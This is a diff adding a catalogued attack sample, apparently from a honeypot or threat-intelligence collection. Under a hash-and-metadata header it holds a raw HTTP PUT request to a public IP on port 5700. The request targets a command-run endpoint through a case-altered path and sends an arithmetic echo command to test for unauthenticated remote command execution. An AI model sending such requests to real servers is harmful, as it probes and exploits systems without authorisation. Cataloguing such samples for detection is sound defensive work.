@@ -1,0 +1,19 @@
+# sha256: 14dd6957ee1da170d964ed8d3466642377d8f17d6b2d4e1a5add79265ca8a085
+# family: script_generic
+# kind: script
+# size_bytes: 339
+# first_seen: 2026-09-04 15:47:42.201984 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+PUT /aPi/system/command-run HTTP/1.1
+Host: 190.179.189.200:5700
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Content-Length: 34
+Accept: */*
+Accept-Language: en
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"command": "echo $((123 * 999))"}
